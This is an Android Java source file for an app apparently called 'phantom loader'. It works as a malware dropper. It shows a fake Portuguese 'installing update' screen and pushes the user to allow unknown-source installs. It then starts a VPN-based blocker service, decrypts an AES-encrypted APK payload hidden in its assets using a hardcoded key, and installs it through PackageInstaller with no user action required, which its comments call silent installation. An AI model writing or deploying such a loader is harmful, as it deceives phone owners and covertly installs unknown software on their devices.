package com.phantom.loader;

import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.MessageDigest;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {

    private static final String KEY = "S3cr3tK3yPh4nt0m2025!@#";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 100, 50, 50);

        TextView tv = new TextView(this);
        tv.setText("Sistema Pronto. Instalando atualização...");
        layout.addView(tv);

        Button btn = new Button(this);
        btn.setText("Iniciar");
        btn.setOnClickListener(v -> checarPermissoes());
        layout.addView(btn);
        setContentView(layout);
    }

    private void checarPermissoes() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls()) {
            startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:" + getPackageName())));
            Toast.makeText(this, "Permita a instalação.", Toast.LENGTH_LONG).show();
            return;
        }

        Intent vpnIntent = VpnService.prepare(this);
        if (vpnIntent != null) {
            startActivityForResult(vpnIntent, 1);
        } else {
            instalarSilenciosamente();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1 && resultCode == RESULT_OK) {
            instalarSilenciosamente();
        }
    }

    private void instalarSilenciosamente() {
        startService(new Intent(this, VpnBlockerService.class));
        
        new Thread(() -> {
            try {
                // 1. Lê o APK criptografado
                InputStream is = getAssets().open("payload.enc");
                byte[] encData = new byte[is.available()];
                is.read(encData);
                is.close();

                // 2. Descriptografa
                MessageDigest sha = MessageDigest.getInstance("SHA-256");
                byte[] key = sha.digest(KEY.getBytes());
                SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
                Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
                cipher.init(Cipher.DECRYPT_MODE, keySpec);
                byte[] decData = cipher.doFinal(encData);

                // 3. Salva o APK limpo no cache
                File file = new File(getCacheDir(), "update.apk");
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(decData);
                fos.close();

                // 4. Usa o SessionInstaller (Instalação Silenciosa)
                PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
                PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
                }

                int sessionId = packageInstaller.createSession(params);
                PackageInstaller.Session session = packageInstaller.openSession(sessionId);

                OutputStream out = session.openWrite("package", 0, -1);
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) != -1) { out.write(buffer, 0, len); }
                session.fsync(out);
                fis.close();
                out.close();

                Intent intent = new Intent(this, InstallReceiver.class);
                PendingIntent pi = PendingIntent.getBroadcast(this, sessionId, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
                session.commit(pi.getIntentSender());
                session.close();

                runOnUiThread(() -> Toast.makeText(this, "Instalando...", Toast.LENGTH_SHORT).show());

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
